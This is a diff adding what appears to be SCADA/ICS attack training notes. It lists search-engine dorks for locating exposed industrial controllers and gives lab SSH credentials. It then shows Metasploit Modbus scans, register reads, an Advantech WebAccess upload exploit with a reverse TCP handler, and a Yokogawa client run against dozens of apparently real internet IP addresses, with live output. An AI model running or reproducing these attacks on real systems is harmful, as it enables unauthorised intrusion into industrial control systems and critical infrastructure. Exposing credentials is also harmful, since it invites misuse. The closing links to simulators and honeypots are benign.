@@ -1,0 +1,486 @@
+                               ################
+############################## # Google Dorks # ##############################
+                               ################
+
+"login" intitle:"scada login"
+
+
+
+
+
+####################
+# Siemens Products #
+####################
+inurl:/Portal0000.htm
+inurl:"Portal/Portal.mwsl"
+intitle:"Miniweb Start Page" | inurl:"/CSS/Miniweb.css"
+
+
+#####################################
+# Allen-Bradley Rockwell Automation #
+#####################################
+intitle:"Rockwell Automation" "Device Name" "Uptime"
+inurl:dtm.html intitle:1747-L552
+inurl:dtm.html intitle:1747-L551
+inurl:home.htm intitle:1766
+
+
+
+                               ################
+############################## # Shodan Dorks # ##############################
+                               ################
+
+######################
+# Schneider Electric #
+######################
+PowerLogic PM800
+8650 ION
+
+Reference:
+https://www.slideshare.net/qqlan/icsscadaplc-googleshodanhq-cheat-sheet
+
+
+
+
+                               ###################################
+############################## # Attacking SCADA with Metasploit # ##############################
+                               ###################################
+
+###################
+# Student account #
+###################
+Here is a good tutorial that you should complete before doing the labs below:
+http://linuxsurvival.com/linux-tutorial-introduction/
+ 
+ 
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ip:		    149.28.239.26:4
+protocol:	ssh
+port:		22
+user: 		secureninja-scada
+password: 	Hacking-ICS-123!! 
+ 
+ 
+To run Metasploit:
+---------------------------Type This-----------------------------------
+sudo msfconsole
+----------------------------------------------------------------------
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Interpretation:
+    When you are running modules then you may see output like this:
+        connection was refused by the remote host: It generally mean we get blocked by firewall.
+        The connection timed out: The service runs in different port, or it not running at all.
+ 
+ 
+ 
+Some modules attack only windows based hosts, so it is better to filer the IPs by the running OS,
+check the operating system type using nmap:
+ 
+
+sudo nmap --script smb-os-discovery.nse -p445 <List of ip separated by space>
+-
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Using Metasploit we can search for Modbus Modules
+-------------------------------------------------
+Module: auxiliary/scanner/scada/modbusdetect                             Modbus Version Scanner
+ 
+
+
+
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/scada/modbusdetect
+set RHOSTS 127.0.0.1
+run
+----------------------------------------------------------------------
+
+
+
+
+Output:
+    [+] 127.0.0.1:502         - 127.0.0.1:502 - MODBUS - received correct MODBUS/TCP header (unit-ID: 1)
+    [*] 127.0.0.1:502         - Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Find Unit ID's
+-------------------------
+Module: use auxiliary/scanner/scada/modbus_findunitid
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/scada/modbus_findunitid
+set RHOSTS 127.0.0.1
+run
+----------------------------------------------------------------------
+
+
+
+
+
+
+Output:      
+    [*] Running module against 127.0.0.1
+ 
+    [+] 127.0.0.1:502 - Received: correct MODBUS/TCP from stationID  1
+    [+] 127.0.0.1:502 - Received: correct MODBUS/TCP from stationID  2
+    [+] 127.0.0.1:502 - Received: correct MODBUS/TCP from stationID  3
+    [+] 127.0.0.1:502 - Received: correct MODBUS/TCP from stationID  4
+    [+] 127.0.0.1:502 - Received: correct MODBUS/TCP from stationID  5
+    ...
+    ^C[-] 127.0.0.1:502 - Stopping running against current target...
+    [*] 127.0.0.1:502 - Control-C again to force quit all targets.
+    [*] Auxiliary module execution completed
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Read and write data to a PLC using the Modbus protocol.
+-------------------------
+Module: auxiliary/scanner/scada/modbusclient                             Modbus Client Utility
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/scada/modbusclient
+set DATA_ADDRESS 1
+set RHOSTS 85.105.152.58, 217.243.233.147, 37.84.40.39, 46.35.12.123, 91.189.101.99, 46.44.28.5, 81.168.114.148, 166.247.102.45, 120.157.47.29, 81.236.12.221
+run
+----------------------------------------------------------------------
+
+
+
+
+
+
+Output:
+    [*] Running module against 85.105.152.58
+    [*] 85.105.152.58:502 - Sending READ HOLDING REGISTERS...
+    [-] 85.105.152.58:502 - Unknown answer
+    [*] Running module against 217.243.233.147
+    [*] 217.243.233.147:502 - Sending READ HOLDING REGISTERS...
+    [-] 217.243.233.147:502 - Error : ILLEGAL DATA ADDRESS
+    [*] Running module against 37.84.40.39
+    [*] 37.84.40.39:502 - Sending READ HOLDING REGISTERS...
+    [+] 37.84.40.39:502 - 100 register values from address 1 :
+    [+] 37.84.40.39:502 - [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    [*] Running module against 46.35.12.123
+    [*] 46.35.12.123:502 - Sending READ HOLDING REGISTERS...
+    [-] 46.35.12.123:502 - Error : ILLEGAL DATA ADDRESS
+    [*] Running module against 91.189.101.99
+    [*] 91.189.101.99:502 - Sending READ HOLDING REGISTERS...
+    [-] 91.189.101.99:502 - Error : ILLEGAL DATA ADDRESS
+    [*] Running module against 46.44.28.5
+    [*] 46.44.28.5:502 - Sending READ HOLDING REGISTERS...
+    [+] 46.44.28.5:502 - 100 register values from address 1 :
+    [+] 46.44.28.5:502 - [8224, 8224, 8224, 8224, 8224, 8224, 8224, 8224, 8224, 8224, 8224, 21041, 11825, 11829, 8224, 8224, 12846, 13368, 11843, 20533, 12340, 11845, 16723, 21504, 2, 0, 100, 229, 440, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2343, 2380, 2204, 500, 0, 0, 0, 0, 0, 0, 2, 2200, 500, 24, 0, 0, 0, 0, 0, 0, 2200, 1100, 2400, 500, 0, 0, 0, 0, 0, 0, 120, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    [*] Running module against 81.168.114.148
+    [*] 81.168.114.148:502 - Sending READ HOLDING REGISTERS...
+    [-] 81.168.114.148:502 - Unknown error
+    [*] Running module against 166.247.102.45
+    [*] 166.247.102.45:502 - Sending READ HOLDING REGISTERS...
+    [+] 166.247.102.45:502 - 100 register values from address 1 :
+    [+] 166.247.102.45:502 - [42143, 16283, 1, 16000, 14756, 16271, 1, 16000, 30895, 16001, 30895, 16001, 53116, 16226, 53116, 16226, 31775, 16161, 51086, 16158, 44077, 16221, 44077, 16221, 0, 0, 0, 0, 0, 0, 22523, 16719, 0, 0, 0, 0, 0, 0, 0, 0, 17819, 18345, 0, 0, 0, 0, 0, 0, 40285, 16719, 0, 0, 0, 0, 0, 0, 0, 0, 30677, 18683, 0, 0, 0, 0, 0, 0, 0, 0, 15564, 17460, 27516, 16778, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 20482, 48281, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    [*] Running module against 120.157.47.29
+    [*] 120.157.47.29:502 - Sending READ HOLDING REGISTERS...
+    [+] 120.157.47.29:502 - 100 register values from address 1 :
+    [+] 120.157.47.29:502 - [1, 1, 1, 1, 0, 0, 0, 1, 533, 533, 421, 597, 721, 578, 0, 0, 0, 570, 21, 21, 21, 21, 21, 21, 0, 0, 0, 21, 11, 11, 10, 11, 10, 11, 0, 0, 0, 11, 1952, 1952, 1806, 1943, 1816, 1842, 0, 0, 0, 1872, 9, 32767, 0, 32767, 32767, 57, 32767, 0, 32767, 332, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]
+    [*] Running module against 81.236.12.221
+    [*] 81.236.12.221:502 - Sending READ HOLDING REGISTERS...
+    [+] 81.236.12.221:502 - 100 register values from address 1 :
+    [+] 81.236.12.221:502 - [186, 219, 200, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767, 32767]
+    [*] Auxiliary module execution completed
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Advantech WebAccess Dashboard Viewer uploadImageCommon
+-------------------------
+Module: exploit/windows/scada/advantech_webaccess_dashboard_file_upload
+ 
+---------------------------Type This-----------------------------------
+use exploit/windows/scada/advantech_webaccess_dashboard_file_upload
+set LHOST <PENTESTER_MACHINE_IP>
+set RHOSTS 180.106.49.61, 111.67.22.113, 18.216.97.13, 92.111.176.156, 167.172.236.47, 125.133.120.89, 74.207.241.183, 76.31.116.9, 34.193.252.20, 34.195.232.54, 111.67.22.114, 159.203.70.183, 190.61.51.235, 34.197.79.104, 40.87.45.154, 66.175.222.58, 5.196.95.208, 163.30.46.20, 18.221.95.245, 111.67.22.112, 176.93.42.26, 125.133.120.91, 52.221.99.106, 111.67.22.114, 173.201.2.17, 115.197.188.245, 97.64.205.26, 18.138.82.76, 159.65.254.19, 66.11.42.85, 13.234.163.37, 180.107.81.51, 111.67.22.112, 3.208.81.176, 212.61.153.5, 73.230.217.70, 128.53.84.248, 163.30.46.28, 220.130.7.227, 18.207.253.39
+run
+----------------------------------------------------------------------
+
+
+
+
+
+
+Output:
+    [*] Exploiting target 180.106.49.61
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 111.67.22.113
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 111.67.22.113:80 - Target is not vulnerable.
+    [*] Exploiting target 18.216.97.13
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 92.111.176.156
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 92.111.176.156:80 - Target is not vulnerable.
+    [*] Exploiting target 167.172.236.47
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 167.172.236.47:80 - Target is not vulnerable.
+    [*] Exploiting target 125.133.120.89
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 125.133.120.89:80 - Target is not vulnerable.
+    [*] Exploiting target 74.207.241.183
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 76.31.116.9
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 34.193.252.20
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 34.193.252.20:80 - Target is not vulnerable.
+    [*] Exploiting target 34.195.232.54
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 34.195.232.54:80 - Target is not vulnerable.
+    [*] Exploiting target 111.67.22.114
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 111.67.22.114:80 - Target is not vulnerable.
+    [*] Exploiting target 159.203.70.183
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 190.61.51.235
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 34.197.79.104
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 34.197.79.104:80 - Target is not vulnerable.
+    [*] Exploiting target 40.87.45.154
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 40.87.45.154:80 - Target is not vulnerable.
+    [*] Exploiting target 66.175.222.58
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 66.175.222.58:80 - Target is not vulnerable.
+    [*] Exploiting target 5.196.95.208
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 5.196.95.208:80 - Target is not vulnerable.
+    [*] Exploiting target 163.30.46.20
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 163.30.46.20:80 - Target is not vulnerable.
+    [*] Exploiting target 18.221.95.245
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 18.221.95.245:80 - Target is not vulnerable.
+    [*] Exploiting target 111.67.22.112
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 111.67.22.112:80 - Target is not vulnerable.
+    [*] Exploiting target 176.93.42.26
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 125.133.120.91
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 125.133.120.91:80 - Target is not vulnerable.
+    [*] Exploiting target 52.221.99.106
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 52.221.99.106:80 - Target is not vulnerable.
+    [*] Exploiting target 111.67.22.114
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 111.67.22.114:80 - Target is not vulnerable.
+    [*] Exploiting target 173.201.2.17
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 173.201.2.17:80 - Target is not vulnerable.
+    [*] Exploiting target 115.197.188.245
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 97.64.205.26
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 97.64.205.26:80 - Target is not vulnerable.
+    [*] Exploiting target 18.138.82.76
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 159.65.254.19
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 66.11.42.85
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 13.234.163.37
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 180.107.81.51
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 111.67.22.112
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 111.67.22.112:80 - Target is not vulnerable.
+    [*] Exploiting target 3.208.81.176
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 212.61.153.5
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 73.230.217.70
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 73.230.217.70:80 - Target is not vulnerable.
+    [*] Exploiting target 128.53.84.248
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 163.30.46.28
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 163.30.46.28:80 - Target is not vulnerable.
+    [*] Exploiting target 220.130.7.227
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [-] Exploit failed: NoMethodError undefined method `get_json_document' for nil:NilClass
+    [*] Exploiting target 18.207.253.39
+    [*] Started reverse TCP handler on 149.28.239.26:4444
+    [*] 18.207.253.39:80 - Target is not vulnerable.
+    [*] Exploit completed, but no session was created.
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Discover host information through the Digi International ADDP service
+---------------------------------------------------------------------
+Module: scanner/scada/digi_addp_version
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/scada/digi_addp_version
+set RHOSTS 159.138.247.118, 47.89.191.67, 117.78.0.83, 101.200.201.208, 159.138.241.185, 77.241.235.60, 47.108.135.77, 47.252.80.226, 47.90.76.10, 121.36.141.175, 159.138.241.185, 121.37.18.173, 121.37.20.93, 47.103.136.32, 185.135.81.161, 178.115.225.102, 121.37.23.213, 85.10.93.237, 119.3.173.22, 159.138.247.118, 121.36.137.187, 47.252.80.226, 116.62.39.231, 8.209.81.240, 47.103.124.74, 121.36.141.175, 119.3.157.114, 92.104.172.94, 121.37.23.213, 101.200.201.208, 47.89.191.67, 117.78.0.83, 159.138.147.130, 159.138.241.185, 47.108.135.77, 77.241.235.60, 47.90.76.10, 147.139.161.210
+run
+----------------------------------------------------------------------
+
+
+
+
+
+
+Output:    
+    [*] Finding ADDP nodes within 159.138.247.118->147.139.161.210 (38 hosts)
+    [*] Scanned 38 of 38 hosts (100% complete)
+    [*] Auxiliary module execution completed
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Allow an unauthenticated user to interact with the Yokogawa CENTUM CS3000 service
+---------------------------------------------------------------------------------
+Module: auxiliary/admin/scada/yokogawa_bkbcopyd_client
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/admin/scada/yokogawa_bkbcopyd_client
+set action RETR
+set RHOSTS 182.23.4.50, 216.130.151.217, 114.57.190.20, 216.130.151.213, 182.253.27.117, 210.160.226.240, 216.130.151.25, 217.14.95.81, 183.91.86.107, 52.58.141.191, 216.130.129.52, 82.106.139.36, 216.130.151.225, 208.38.227.20, 183.101.49.60, 210.160.226.241, 116.12.151.216, 113.166.92.225, 12.200.223.55, 183.91.86.111, 182.30.224.104, 122.28.50.238, 60.248.154.24, 209.52.71.58, 203.125.202.69, 210.161.43.96, 103.82.146.13, 216.130.151.193, 216.13.183.207, 116.211.5.214, 182.30.224.86, 114.57.190.20, 182.30.224.237, 182.30.224.228, 182.30.224.228, 122.28.50.238, 216.130.151.17, 216.130.151.207, 60.43.234.117, 117.239.41.6, 217.117.3.162, 182.30.224.128, 182.30.224.253, 210.212.165.150, 182.30.224.98, 60.43.234.117
+run
+----------------------------------------------------------------------
+
+
+
+
+
+Output:
+[*] 182.23.4.50:20111 - 27101
+[*] 182.23.4.50:20111 - Sending RETR packet...
+[-] 182.23.4.50:20111 - Auxiliary failed: Rex::ConnectionRefused The connection was refused by the remote host (182.23.4.50:20111).
+[-] 182.23.4.50:20111 - Call stack:
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:298:in `rescue in create_by_type'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:263:in `create_by_type'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:33:in `create'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:49:in `create_param'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket/tcp.rb:37:in `create_param'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.23/lib/rex/socket/tcp.rb:28:in `create'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/tcp.rb:106:in `connect'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/framework/modules/auxiliary/admin/scada/yokogawa_bkbcopyd_client.rb:86:in `send_pkt'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/framework/modules/auxiliary/admin/scada/yokogawa_bkbcopyd_client.rb:70:in `exploit'
+[-] 182.23.4.50:20111 -   /opt/metasploit-framework/embedded/framework/modules/auxiliary/admin/scada/yokogawa_bkbcopyd_client.rb:47:in `run'
+ 
+....
+[*] Running module against 210.212.165.150
+[*] 210.212.165.150:20111 - 52431
+[*] 210.212.165.150:20111 - Sending RETR packet...
+[-] 210.212.165.150:20111 - Auxiliary failed: Rex::ConnectionTimeout The connection timed out (210.212.165.150:20111).
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+
+References:
+https://www.peerlyst.com/posts/how-to-attack-and-defend-scada-systems-chiheb-chebbi
+https://www.hackers-arise.com/post/2016/11/25/scada-hacking-metasloit-scada-modules
+https://www.hackers-arise.com/post/2018/10/22/metasploit-basics-part-16-metasploit-scada-hacking
+
+
+
+
+                               ##############
+############################## # SCADA CTFs # ##############################
+                               ##############
+
+
+
+
+
+
+
+
+References:
+https://advancedpersistentjest.com/2016/07/31/writeup-tmctf-iot100/
+https://github.com/digitalbond/CTF-Challenges
+
+                               ####################
+############################## # SCADA Simulators # ##############################
+                               ####################
+
+
+
+References:
+https://github.com/sintax1/scadasim
+https://github.com/hi-KK/ICS-Common-Protocol-Simulator
+https://github.com/mjfarmer/scada_py
+
+
+
+
+                               ###################
+############################## # SCADA Honeypots # ##############################
+                               ###################
+
+
+
+
+
+
+
+
+
+
+References:
+https://github.com/mushorg/conpot
+https://dtag-dev-sec.github.io/mediator/feature/2016/03/11/t-pot-16.03.html
